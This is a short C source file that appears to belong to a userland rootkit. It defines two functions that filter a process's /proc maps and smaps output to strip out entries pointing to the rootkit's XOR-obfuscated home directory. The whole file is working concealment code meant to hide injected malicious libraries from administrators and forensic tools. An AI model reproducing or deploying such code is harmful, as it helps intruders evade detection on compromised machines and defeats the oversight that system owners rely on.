#include "../rkconsts.h"

int hide_maps(char *path) {
    DEBUG_MSG("[-] hide_maps() called\n");
    char buf[8192];

    char *rk_home = strdup(RK_HOME); xor(rk_home);
    FILE *tmp_fp = tmpfile(); 
    int maps_fd = syscall(2, path, O_RDONLY);

    if (maps_fd == -1) return -1;
    FILE *maps_fp = fdopen(maps_fd, "r");
    if (!tmp_fp) return fileno(maps_fp);

    while (fgets(buf, sizeof(buf), maps_fp) != NULL) {
        if (!strstr(buf, rk_home)) {
            fputs(buf, tmp_fp);
        }
        else {
            DEBUG_MSG("[!] Skipping line\n");
        }
    }
    fclose(maps_fp);
    fseek(tmp_fp, 0, SEEK_SET);
    CLEAN(rk_home);
    return fileno(tmp_fp);
}

int hide_smaps(char *path) {
    DEBUG_MSG("[-] hide_smaps() called\n");
    char buf[8192];
    
    char *rk_home = strdup(RK_HOME); xor(rk_home);
    FILE *tmp_fp = tmpfile(); 
    int smaps_fd = syscall(2, path, O_RDONLY);
    
    if (smaps_fd == -1) return -1;
    FILE *smaps_fp = fdopen(smaps_fd, "r");
    if (!tmp_fp) return fileno(smaps_fp);

    int i = 0;
    int ignore = 0;
    while (fgets(buf, sizeof(buf), smaps_fp) != NULL) {
        if (i == 0) {
            if (strstr(buf, rk_home) != NULL) {
                ignore = 1;
            }
            else {
                fputs(buf, tmp_fp);
                ignore = 0;
            }
        }
        else {
            if (!ignore) {
                fputs(buf, tmp_fp);
            }
        }
        i = (i+1) % 23;
    }
    fclose(smaps_fp);
    fseek(tmp_fp, 0, SEEK_SET);
    CLEAN(rk_home);
    return fileno(tmp_fp);
}